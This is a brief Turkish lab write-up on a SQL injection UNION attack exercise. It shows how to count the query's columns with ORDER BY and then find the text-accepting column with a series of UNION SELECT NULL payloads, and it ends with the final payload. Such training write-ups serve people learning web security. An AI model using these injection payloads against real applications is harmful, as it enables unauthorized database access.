# Lab: SQL injection UNION attack, finding a column containing text

## Hedef
Kategori filtresindeki SQLi zafiyetini kullanarak, hangi sütunun string (metin) verisi kabul ettiğini bulmak.

## Çözüm Adımları
1. **Sütun Sayısı Tespiti:** Önce `'+ORDER+BY+3--` ile sistemin 3 sütun döndürdüğünü doğruladım.
2. **Metin Sütununu Bulma:** Her bir sütunu sırayla test ettim:
   - `' UNION SELECT 'a', NULL, NULL--` (Hata alırsan metin sütunu bu değildir)
   - `' UNION SELECT NULL, 'a', NULL--` (200 OK ve 'a' yazısı görünürse doğru sütun budur)
3. **Labı Tamamlama:** Laboratuvarın bana özel olarak verdiği rastgele string değerini doğru sütuna yerleştirip isteği gönderdim.

## Kullanılan Payload
`' UNION SELECT NULL, 'lab_tarafindan_verilen_string', NULL--`
